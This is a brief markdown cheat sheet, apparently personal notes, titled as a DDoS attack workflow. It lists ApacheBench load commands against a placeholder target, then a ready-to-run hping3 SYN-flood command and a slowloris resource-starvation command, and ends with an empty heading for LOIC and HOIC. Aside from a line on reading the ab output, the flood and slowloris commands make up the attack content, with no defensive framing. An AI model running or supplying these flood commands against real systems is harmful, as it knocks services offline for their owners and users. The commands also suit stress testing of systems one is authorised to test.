# Workflow: DDos Attack Using ab + hping3 + slowloris

For normal loads

``ab -n 100 -c 10 http://target-app/``

Push server loads

``ab -n 1000 -c 100 http://target-app/``

Understanding output:
Look out for failed requests, higher time/reqs, and error codes

SYN Floods

``sudo hping3 -S -p 80 --flood <Target IP>``

Slowloris - Resource Starvation

``slowloris target-app -p 80 -s 500``

# Workflow Using LoiC & HoiC

